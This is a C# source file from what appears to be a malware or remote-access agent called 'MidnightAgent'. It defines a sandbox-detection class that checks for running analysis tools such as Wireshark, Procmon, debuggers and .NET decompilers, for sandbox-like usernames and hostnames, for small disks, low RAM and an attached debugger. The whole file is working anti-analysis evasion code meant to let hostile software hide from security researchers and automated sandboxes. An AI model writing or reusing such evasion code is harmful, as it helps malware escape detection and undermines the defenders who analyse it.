using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace MidnightAgent.Security
{
    /// <summary>
    /// Detect if running in a sandbox/analysis environment
    /// </summary>
    public static class SandboxDetection
    {
        private static readonly string[] SandboxProcesses = new[]
        {
            "wireshark", "fiddler", "charles",           // Network analyzers
            "procmon", "procexp", "processhacker",       // Process monitors
            "autoruns", "tcpview", "regmon",             // Sysinternals
            "ollydbg", "x64dbg", "x32dbg", "ida",        // Debuggers
            "immunitydebugger", "windbg",
            "dnspy", "de4dot", "ilspy",                  // .NET decompilers
            "dumpcap", "rawshark",                       // Packet capture
            "pestudio", "peview", "die",                 // PE analyzers
            "fakenet", "regshot", "apimonitor"           // Analysis tools
        };

        private static readonly string[] SandboxUsernames = new[]
        {
            "sandbox", "virus", "malware", "sample",
            "test", "john", "user", "admin", "currentuser",
            "vmware", "virtual", "johnson", "miller"
        };

        private static readonly string[] SandboxHostnames = new[]
        {
            "sandbox", "malware", "virus", "sample",
            "test", "virtual", "analysis"
        };

        /// <summary>
        /// Check if running in a sandbox
        /// </summary>
        public static bool IsSandbox()
        {
            try
            {
                // Check for analysis tools
                if (CheckSandboxProcesses())
                    return true;

                // Check username
                if (CheckSandboxUsername())
                    return true;

                // Check hostname
                if (CheckSandboxHostname())
                    return true;

                // Check for small disk
                if (CheckSmallDisk())
                    return true;

                // Check for low RAM
                if (CheckLowRam())
                    return true;

                // Check for debugger
                if (IsDebuggerPresent())
                    return true;

                return false;
            }
            catch
            {
                return false; // Fail open
            }
        }

        private static bool CheckSandboxProcesses()
        {
            try
            {
                var runningProcesses = Process.GetProcesses()
                    .Select(p => p.ProcessName.ToLower())
                    .ToArray();

                return SandboxProcesses.Any(sb =>
                    runningProcesses.Contains(sb.ToLower()));
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckSandboxUsername()
        {
            try
            {
                string username = Environment.UserName.ToLower();
                return SandboxUsernames.Any(sb =>
                    username.Contains(sb.ToLower()));
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckSandboxHostname()
        {
            try
            {
                string hostname = Environment.MachineName.ToLower();
                return SandboxHostnames.Any(sb =>
                    hostname.Contains(sb.ToLower()));
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckSmallDisk()
        {
            try
            {
                // Sandboxes often have small disks (< 60GB)
                var drives = DriveInfo.GetDrives();
                foreach (var drive in drives)
                {
                    if (drive.DriveType == DriveType.Fixed)
                    {
                        long sizeGB = drive.TotalSize / (1024 * 1024 * 1024);
                        if (sizeGB < 60)
                        {
                            return true;
                        }
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckLowRam()
        {
            try
            {
                // Sandboxes often have low RAM (< 4GB)
                using (var searcher = new System.Management.ManagementObjectSearcher(
                    "SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
                {
                    foreach (System.Management.ManagementObject obj in searcher.Get())
                    {
                        long memoryKB = Convert.ToInt64(obj["TotalVisibleMemorySize"]);
                        long memoryGB = memoryKB / (1024 * 1024);
                        if (memoryGB < 4)
                        {
                            return true;
                        }
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        private static bool IsDebuggerPresent()
        {
            return System.Diagnostics.Debugger.IsAttached;
        }
    }
}
